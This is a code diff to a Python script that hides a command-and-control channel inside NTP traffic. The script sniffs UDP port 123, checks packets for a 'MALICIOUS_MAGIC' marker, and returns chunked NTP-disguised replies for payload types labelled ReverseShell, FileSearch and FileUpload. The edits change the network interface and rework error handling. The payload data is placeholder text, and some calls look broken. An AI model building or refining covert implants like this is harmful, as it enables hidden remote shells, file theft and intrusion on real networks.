@@ -29,7 +29,7 @@ from scapy.all import sniff, IP, UDP, NTP
 
 # === CONFIGURATION ===
 TARGET_RANGE = "10.10.10.0/24"
-INTERFACE = "eth0"              # Fallback
+INTERFACE = "ens3"              # Fallback
 SERVER_HOST = "10.10.10.50"
 SERVER_IP = "10.10.10.69"
 NTP_PORT = 123
@@ -232,79 +232,118 @@ def auto_detect_interface(target_range="10.10.10.0/24", timeout=5):
     print(f"[-] No active interface found for {target_range}, using default: {INTERFACE}")
     return INTERFACE
 
-# === MAIN LOOP ===
+# === MAIN LOOP (Fixed Syntax) ===
 def sniff_loop(interface, filter_str, timeout=5):
-    print(f"[+] Starting NTP Sniffer on {interface}...")
-    print(f"[+] Filter: {filter_str}")
-    
-    start_search_threads()
-    
-    while True:
-        try:
-            # 1. Create raw socket for sniffing (more control)
-            print(f"[+] Creating raw socket for {interface}...")
+    sock = None  # Global socket for sniffing
+    try:
+        print(f"[+] Starting NTP Sniffer on {interface}...")
+        print(f"[+] Filter: {filter_str}")
+        
+        start_search_threads()
+        
+        while True:
             try:
-                # Try to use AF_PACKET (Linux) or AF_INET (fallback)
-                if interface != "lo":
+                # 1. Create raw socket for sniffing
+                print(f"[+] Creating raw socket for {interface}...")
+                try:
                     # Linux: Use AF_PACKET for raw capture
-                    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(123))  # UDP port 123
-                else:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+                    if interface != "lo":
+                        # Try AF_PACKET (need root)
+                        try:
+                            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(123))
+                        except socket.error:
+                            print(f"  [!] AF_PACKET failed, trying AF_INET fallback...")
+                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                            sock.bind((SERVER_HOST, NTP_PORT))
+                    else:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                        sock.bind((SERVER_HOST, NTP_PORT))
+                    
+                    # 2. Set timeout for sniffing
+                    sock.settimeout(timeout)
+                    
+                    # 3. Sniff packet
+                    packet = sock.recvfrom(65535)  # 64KB buffer
+                    ntp_pkt, src_ip = packet
+                    
+                    # 4. Check Magic Byte
+                    raw = scapy.raw(ntp_pkt)
+                    if raw[1:7] == MALICIOUS_MAGIC:
+                        # 5. Receive Payload Type
+                        connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        connection.bind((SERVER_HOST, NTP_PORT))
+                        
+                        type_data = connection.recv(6)
+                        type_str = type_data.decode().strip()
+                        
+                        payload_cfg = {
+                            "ReverseShell": {"Type": "ReverseShell", "Size": 4096, "Data": b"READY"},
+                            "FileSearch": {"Type": "FileSearch", "Size": 4096, "Data": b"QUEUED"},
+                            "FileUpload": {"Type": "FileUpload", "Size": 4096, "Data": b"LISTENING"}
+                        }
+                        
+                        size = 4096
+                        size_chunk = pack_ntp_resp(MAGIC_BYTE, f"{MAGIC_BYTE}{size}".encode())
+                        connection.send(size_chunk)
+                        
+                        content = payload_cfg.get(type_str, payload_cfg["ReverseShell"])["Data"]
+                        for i in range(0, len(content), CHUNK_SIZE):
+                            chunk = content[i:i+CHUNK_SIZE]
+                            chunk_pkt = pack_ntp_resp(MAGIC_BYTE, chunk)
+                            connection.send(chunk_pkt)
+                            time.sleep(SLEEP)
+                        
+                        connection.send(pack_ntp_resp(MAGIC_BYTE, b"\x00"))
+                    
+                # Inner except for socket errors
+                except socket.timeout:
+                    print(f"[+] Timeout. Waiting for next packet...")
+                    time.sleep(SLEEP)
+                except socket.error as e:
+                    print(f"  [!] Socket Error: {e}")
+                    time.sleep(SLEEP)
+                except Exception as e:
+                    print(f"  [!] Sniff Packet Error: {e}")
+                    time.sleep(SLEEP)
+            
+            # Outer except for socket reconnection
+            except socket.timeout:
+                print(f"[+] Outer Timeout. Waiting for next packet...")
+                time.sleep(SLEEP)
+            except socket.error as e:
+                print(f"[-] Outer Socket Error: {e}")
+                try:
+                    # Try to reconnect
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                     sock.bind((SERVER_HOST, NTP_PORT))
-                    
-                # 2. Set timeout for sniffing
-                sock.settimeout(timeout)
-                
-                # 3. Sniff packet
-                packet = sock.recvfrom(65535)  # 64KB buffer
-                ntp_pkt, src_ip = packet
-                
-                # 4. Check Magic Byte
-                raw = scapy.raw(ntp_pkt)
-                if raw[1:7] == MALICIOUS_MAGIC:
-                    # 5. Receive Payload Type
-                    connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    connection.bind((SERVER_HOST, NTP_PORT))
-                    
-                    type_data = connection.recv(6)
-                    type_str = type_data.decode().strip()
-                    
-                    payload_cfg = {
-                        "ReverseShell": {"Type": "ReverseShell", "Size": 4096, "Data": b"READY"},
-                        "FileSearch": {"Type": "FileSearch", "Size": 4096, "Data": b"QUEUED"},
-                        "FileUpload": {"Type": "FileUpload", "Size": 4096, "Data": b"LISTENING"}
-                    }
-                    
-                    size = 4096
-                    size_chunk = pack_ntp_resp(MAGIC_BYTE, f"{MAGIC_BYTE}{size}".encode())
-                    connection.send(size_chunk)
-                    
-                    content = payload_cfg.get(type_str, payload_cfg["ReverseShell"])["Data"]
-                    for i in range(0, len(content), CHUNK_SIZE):
-                        chunk = content[i:i+CHUNK_SIZE]
-                        chunk_pkt = pack_ntp_resp(MAGIC_BYTE, chunk)
-                        connection.send(chunk_pkt)
-                        time.sleep(SLEEP)
-                    
-                    connection.send(pack_ntp_resp(MAGIC_BYTE, b"\x00"))
-        
-        except socket.timeout:
-            print(f"[+] Timeout. Waiting for next packet...")
-            time.sleep(SLEEP)
-        except Exception as e:
-            print(f"[-] Sniff Error: {e}")
-            # Try to reconnect
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                sock.bind((SERVER_HOST, NTP_PORT))
-                sock.settimeout(timeout)
-            except Exception as e2:
-                print(f"  [!] Reconnect Error: {e2}")
+                    sock.settimeout(timeout)
+                except Exception as e2:
+                    print(f"  [!] Reconnect Error: {e2}")
+                    time.sleep(SLEEP)
+            except Exception as e:
+                print(f"[-] Outer Sniff Error: {e}")
                 time.sleep(SLEEP)
-        finally:
-            time.sleep(SLEEP)
+            finally:
+                # Cleanup
+                if sock:
+                    try:
+                        sock.settimeout(timeout)
+                    except:
+                        pass
+                    finally:
+                        time.sleep(SLEEP)
+    
+    finally:
+        # Final cleanup
+        if sock:
+            try:
+                sock.close()
+                print("[+] Socket closed.")
+            except:
+                pass
 
 def print_banner():
     print("""
